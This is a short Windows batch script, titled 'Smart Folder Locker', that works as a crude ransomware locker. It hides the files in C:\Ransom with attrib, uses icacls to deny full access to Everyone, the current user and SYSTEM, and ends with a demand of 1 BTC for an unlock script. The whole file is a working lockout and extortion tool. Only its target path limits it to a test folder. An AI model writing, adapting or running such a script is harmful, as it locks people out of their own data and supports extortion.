@echo off
color 4F
title Smart Folder Locker

:: ============================================
:: MAIN LOCKING CODE
:: ============================================
echo.
echo ============================================
echo      SMART FOLDER LOCKER
echo ============================================
echo.

:: Check target folder
set "target=C:\Ransom"
if not exist "%target%" (
    echo ERROR: Folder %target% does not exist!
    echo Creating it first...
    mkdir "%target%"
    echo Created %target% with test files...
    echo Test1 > "%target%\test1.txt"
    echo Test2 > "%target%\test2.txt"
)

echo Locking: %target%
echo.

:: Level 1: Hide everything (System + Hidden attributes)
attrib +H +S +R "%target%"
attrib +H +S +R "%target%\*" /S /D

:: Level 2: Attempt to block permissions
:: Note: These may require manual "Run as Admin" to succeed
icacls "%target%" /deny Everyone:(OI)(CI)F /T >nul 2>&1
icacls "%target%" /deny %USERNAME%:(OI)(CI)F /T >nul 2>&1
icacls "%target%" /deny SYSTEM:(OI)(CI)F /T >nul 2>&1

echo.
echo ============================================
echo LOCKING COMPLETE!
echo ============================================
echo.
echo.
echo Run Unlock.bat to restore access.
echo.
echo TO GET 'UNLOCK.BAT' YOU NEED TO PAY 1BTC!
pause